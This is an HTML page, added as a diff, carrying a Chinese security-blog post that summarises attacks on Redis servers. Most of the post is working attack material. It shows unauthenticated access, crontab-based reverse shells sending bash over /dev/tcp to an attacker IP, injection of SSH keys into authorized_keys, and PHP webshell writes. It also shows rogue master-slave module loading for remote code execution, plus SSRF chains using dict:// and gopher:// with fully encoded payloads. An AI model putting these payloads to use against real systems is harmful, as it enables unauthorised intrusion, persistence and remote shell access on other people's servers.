@@ -1,0 +1,373 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>redis | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">redis</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-04-28</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://pyroxenites.github.io/tag/T5QnKuhLq/">
+                    漏洞研究
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="redis利用总结">redis利用总结</h1>
+<h2 id="未授权访问">未授权访问</h2>
+<pre><code class="language-java">redis-cli -h 1.1.1.1
+redis-cli -h 1.1.1.1 -p 42223
+</code></pre>
+<h2 id="利用计划任务反弹shell">利用计划任务反弹shell</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1641029212270-e64b2860-8ccf-418a-8c46-4592edcba60e.png" alt="image-20211214084927078.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1641029226613-b3c7db9d-e48c-49da-bf61-88ab6fc85288.png" alt="image-20211214084749402.png" loading="lazy"></p>
+<p><code>可以用NC进行连接</code></p>
+<p><code>centos反弹成功,ubuntu失败</code></p>
+<pre><code class="language-shell">set  xx   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.3.20/9999 0&gt;&amp;1\n&quot;
+ 
+config set dir /var/spool/cron/ #设置要导出的目录
+ 
+config set dbfilename root
+ 
+save #保存
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1641029243396-5f7f85d5-0d63-4ba5-a032-a7fe888a0d64.png" alt="image-20211214085443320.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1641029253960-3e3e2e0c-96b3-4d6d-99ae-2ac5b0439d26.png" alt="image-20211214085136264.png" loading="lazy"></figure>
+<h2 id="redis密钥登录ssh">redis密钥登录ssh</h2>
+<ol>
+<li>root权限启动</li>
+<li>有.ssh</li>
+</ol>
+<pre><code class="language-shell">ssh-keygen -t rsa #生成密钥 
+
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt #防止乱码导出key
+     
+cat /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x set xxx #导入内容
+</code></pre>
+<pre><code class="language-shell">config set dir /root/.ssh #设置路径
+ 
+config set dbfilename authorized_keys #设置文件名
+
+save
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1641029269049-ee878b5e-ae0d-49f1-ade9-62a7527b23fa.png" alt="image-20211214090243502.png" loading="lazy"></figure>
+<p>不能getshell</p>
+<pre><code class="language-shell">ssh -i id_rsa root@1.1.1.1
+</code></pre>
+<h2 id="redis写webshell">redis写webshell</h2>
+<ul>
+<li>config set dir /var/www/html/</li>
+<li>config set dbfilename redis.php</li>
+<li>set webshell “”</li>
+<li>save</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1641029301509-893624d5-baf8-4c81-9bb7-9377d28ce5ff.png" alt="image-20211214090712326.png" loading="lazy"></figure>
+<p><code>网站目录可以从phpinfo等信息泄露中寻找</code></p>
+<h2 id="redis主从复制">redis主从复制</h2>
+<h3 id="简介">简介</h3>
+<p>存在于4.x,5.x版本中,redis提供主从模式,使用一个redis作为主机,其他的作为备份机</p>
+<p>主机从机数据都是一样的,从机只负责读,主机只负责写</p>
+<p>在redis4.x后,通过外部拓展,可以实现在redis中实现一个新的Redis命令</p>
+<p>构造恶意.so文件,在两个redis实例设置主从模式的时候,redis的主机实例可以通过FULLRESYNC同步文件到从机上,然后从机加载恶意so文件,即可实现RCE</p>
+<h3 id="利用方式1">利用方式1</h3>
+<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<p>i:正向连接</p>
+<p>r:反弹<br>
+<img src="https://pyroxenites.github.io/post-images/1641029318490-da774b16-9c3e-4250-81cf-e8d55be53349.png" alt="image-20211214091101397.png" loading="lazy"></p>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1641029328218-f0fbba8c-3e6e-4d26-9db3-0cf74f14e00c.png" alt="image-20211214091108736.png" loading="lazy"></figure>
+<h3 id="利用方式2">利用方式2</h3>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<pre><code>./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
+</code></pre>
+<p><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p>
+<h2 id="ssrf-redis反弹shell">ssrf redis反弹shell</h2>
+<ul>
+<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB，Redis）</li>
+<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
+</ul>
+<pre><code class="language-php"> fsockopen()      file_get_contents()     curl_exec()
+</code></pre>
+<p><code>存在ssrf漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议。</code></p>
+<pre><code>GET /ssrf/ssrf.php?url=http://clmppw.dnslog.cn  HTTP/1.1
+
+Host: 192.168.124.1
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: zh,en-US;q=0.7,en;q=0.3
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p><strong>实际功能点</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1641029345675-50d21f09-9d95-4f44-9708-c7b041143282.png" alt="image-20211214094049060.png" loading="lazy"></figure>
+<pre><code>抓包发现post参数好像有点意思，尝试换掉默认图片的地址，改为dnslog地址，返回提示路径不正确。
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1641029356573-0683d6d4-8af3-4f12-b223-3f6ea9bd308e.png" alt="image-20211214094117733.png" loading="lazy"></figure>
+<pre><code>猜测是做了后缀的限制，应该只能post png,jpg等后缀的地址，先试试读取一下远程服务器上的图片，成功返回，果然有东西。
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1641029372324-78f80603-b16f-4223-803f-6c36bf0a935c.png" alt="image-20211214094139460.png" loading="lazy"></figure>
+<pre><code>一个标准的ssrf，，因为没法改变后缀，应该是不能读取passwd之类的文件了，还是先打一波dnslog，记录一下真实ip地址
+
+先借助ssrf探测一下开放的端口，22，80，443，6379。
+</code></pre>
+<h3 id="dic协议端口探测">dic协议端口探测</h3>
+<p>抓包将端口那里设为要爆破的参数</p>
+<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235414093-1882268458.png" alt="" loading="lazy"></figure>
+<p>可以事先准备个端口字典，根据Length升序即可</p>
+<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235413622-1575389802.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1641029399125-dff7dd98-6e11-4ca2-b5f0-f948e9f6597a.png" alt="image-20211214094226111.png" loading="lazy"></figure>
+<p><code>看看攻击redis一般可以利用的dict和gopher两种协议，使用gopher协议的话需要注意一些利用限制。</code></p>
+<figure data-type="image" tabindex="12"><img src="https://pyroxenites.github.io/post-images/1641029412167-53b7e260-eb42-4eb4-912b-9e3b310441a0.png" alt="image-20211214094316997.png" loading="lazy"></figure>
+<p>gopher协议规则比较复杂，经过查找，找到了一款工具，使用其生成的payload很准确，且可自定义。</p>
+<p><a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p>
+<p>需要将内容再进行一次url编码传到web的参数中才会正常运行。</p>
+<h3 id="dict-redis利用">dict redis利用</h3>
+<p>先INFO探测是否设置口令，比如下图提示就是有的</p>
+<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235413188-1418255141.png" alt="" loading="lazy"></figure>
+<ol>
+<li>写入内容:dict://127.0.0.1:6379/set❌test</li>
+<li>设置保存路径:dict://127.0.0.1:6379/config:set:dir:/tmp/</li>
+<li>设置保存文件名：dict://127.0.0.1:6379/config:set:dbfilename:1.png</li>
+<li>保存:dict://127.0.0.1:6379/save</li>
+</ol>
+<p>通过dict协议访问后并没有出现回显，不知道是否存在未授权的redis服务，盲打一顿可能浪费宝贵的时间，灵光乍现，可以先写一个图片文件到tmp目录里，再通过file协议进行读取，出现内容就表明redis是能够利用的。</p>
+<figure data-type="image" tabindex="14"><img src="https://pyroxenites.github.io/post-images/1641029431921-f5a7e65a-8123-411a-a7a9-6c4bef3ca4dc.png" alt="image-20211214095118849.png" loading="lazy"></figure>
+<h4 id="dict写webshell">dict写webshell</h4>
+<p>更改rdb文件的目录至网站目录下</p>
+<pre><code>url=dict://192.168.124.153:6380/config:set:dir:/var/www/html
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235412165-85687148.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235411616-1929322818.png" alt="" loading="lazy"></figure>
+<p>将rdb文件名dbfilename改为webshell的名字</p>
+<pre><code>url=dict://192.168.124.153:6380/config:set:dbfilename:webshell.php
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235411228-782509580.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235410806-1578853433.png" alt="" loading="lazy"></figure>
+<p>如果存在payload被转义或有过滤情况，可利用16进制，写入webshell</p>
+<pre><code>GET /ssrf/ssrf.php?url=dict://192.168.124.153:6380/set:webshell:&quot;\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e&quot;
+</code></pre>
+<p>靶机redis有成功写入，注意最后写save刷新缓存。</p>
+<figure data-type="image" tabindex="19"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235409320-328389569.png" alt="" loading="lazy"></figure>
+<h4 id="dict打计划任务">dict打计划任务</h4>
+<p>因为利用redis去ubuntu写总会有很多玄学问题，这里就用上面准备的centos的redis环境。</p>
+<pre><code class="language-shell">set 1 '\n\n*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n'
+
+转换一下即：
+url=dict://192.168.124.153:6380/set:shell:&quot;\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/192.168.124.141/2333\x200\x3e\x261\n\n&quot;
+但还要注意这里不能够这么写：\x5c 而应该直接就 \n，也不要写\r\n 因为linux换行符就是\n你写\r反而可能会出现参数污染
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235408280-696471952.png" alt="" loading="lazy"></figure>
+<h3 id="gopher利用">gopher利用</h3>
+<p><a href="https://github.com/firebroo/sec_tools/tree/master/">https://github.com/firebroo/sec_tools/tree/master/</a></p>
+<h4 id="gopher写入webshell">gopher写入webshell</h4>
+<p><code>redis.cmd</code>写入攻击所需的redis指令</p>
+<figure data-type="image" tabindex="21"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235407874-1777982043.png" alt="" loading="lazy"></figure>
+<p>运行 <code>redis-over-gopher.py</code> 得到payload</p>
+<figure data-type="image" tabindex="22"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235407460-799619690.png" alt="" loading="lazy"></figure>
+<p>根据目标信息把ip和port换一下即可</p>
+<p>如果这里使用的是<code>curl</code>命令（比如在命令行curl + gopher）url编码一次即可。也就是用下面的payload就可以</p>
+<pre><code>gopher://192.168.124.153:6380/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%33%0d%0a%73%68%65%6c%6c%5f%73%65%63%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a
+</code></pre>
+<p>如果是web端的参数有ssrf，需要url编码两次才可以打进去，只编码一次时 <code>？</code> 会作为干扰使得后面payload打不进去。编码时只把特殊符号编码即可，如下：</p>
+<pre><code>gopher://192.168.124.153:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2533%250d%250a%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2531%2533%250d%250a%2573%2568%2565%256c%256c%255f%2573%2565%2563%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2531%2538%250d%250a%253c%253f%2570%2568%2570%2520%2570%2568%2570%2569%256e%2566%256f%2528%2529%253b%253f%253e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
+</code></pre>
+<p>写入成功。</p>
+<figure data-type="image" tabindex="23"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235405954-771975438.png" alt="" loading="lazy"></figure>
+<h4 id="gopher定时任务反弹shell">gopher定时任务反弹shell</h4>
+<p>关于定时任务：</p>
+<p>centos： 在/var/spool/cron/root 或 /etc/crontab</p>
+<p>ubuntu:   在/var/spool/cron/crontabs/root 或 /etc/crontab</p>
+<p>Ubuntu这个计划任务吧，利用redis写入总会出现问题，这里使用centos的环境。</p>
+<p>与dict打redis类似先将弹shell语句写入 <code>redis.cmd</code></p>
+<pre><code>flushall
+config set dir /var/spool/cron
+config set dbfilename root
+set shell &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.124.
+141/2333 0&gt;&amp;1\n\n&quot;
+save
+</code></pre>
+<p>运行<code>redis-over-gopher.py</code>生成payload，更改payload中的ip和port</p>
+<figure data-type="image" tabindex="24"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235405408-1815946993.png" alt="" loading="lazy"></figure>
+<pre><code>gopher://192.168.124.128:6380/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%35%0d%0a%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%34%0d%0a%72%6f%6f%74%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%35%0d%0a%73%68%65%6c%6c%0d%0a%24%36%30%0d%0a%5c%6e%5c%6e%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%32%34%2e%31%34%31%20%30%3e%26%31%5c%6e%5c%6e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a
+</code></pre>
+<p>同样的，如果不是利用curl的话，直接打需要再次url编码。</p>
+<pre><code>gopher://192.168.124.128:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2535%250d%250a%252f%2576%2561%2572%252f%2573%2570%256f%256f%256c%252f%2563%2572%256f%256e%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2534%250d%250a%2572%256f%256f%2574%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2535%250d%250a%2573%2568%2565%256c%256c%250d%250a%2524%2536%2530%250d%250a%25%5c%256e%25%5c%256e%252a%252f%2531%2520%252a%2520%252a%2520%252a%2520%252a%2520%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2539%2532%252e%2531%2536%2538%252e%2531%2532%2534%252e%2531%2534%2531%2520%2530%253e%2526%2531%25%5c%256e%25%5c%256e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235404218-1887799963.png" alt="" loading="lazy"></figure>
+<h2 id="本地redis主从复制">本地redis主从复制</h2>
+<blockquote>
+<p>一般redis只允许本地访问 bind 127.0.0.1</p>
+<p>进入服务器可以访问redis</p>
+</blockquote>
+<pre><code class="language-shell">redis&gt;config set dir /tmp
+redis&gt;config set dbfilename exp.so
+redis&gt;slaveof 主机vps 主机端口
+
+kali&gt;python3 redis_rogue_server.py -v -path exp.so
+#主动连接主机,从机会同步信息,包括exp.so
+
+redis&gt;module list
+redis&gt;module load ./exp.so
+redis&gt;module list
+redis&gt;system.rev 反弹IP 反弹端口
+redis&gt;slaveof NO ONE  #断开主从连接
+redis&gt;module unload ./exp.so #卸载expso文件
+
+##不加./可能加载可能会失败
+</code></pre>
+<h2 id=""></h2>
+<h2 id="windows">windows</h2>
+<ol>
+<li>写入webshell</li>
+<li>主从复制,so文件变成dll文件</li>
+<li>反弹shell-&gt; 将dirfile写到Startup目录下</li>
+</ol>
+<h2 id="利用工具">利用工具</h2>
+<p><a href="https://github.com/yuyan-sec/RedisEXP">https://github.com/yuyan-sec/RedisEXP</a></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/amsi-rao-guo/">
+              <h3 class="post-title">
+                下一篇：AMSI绕过
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
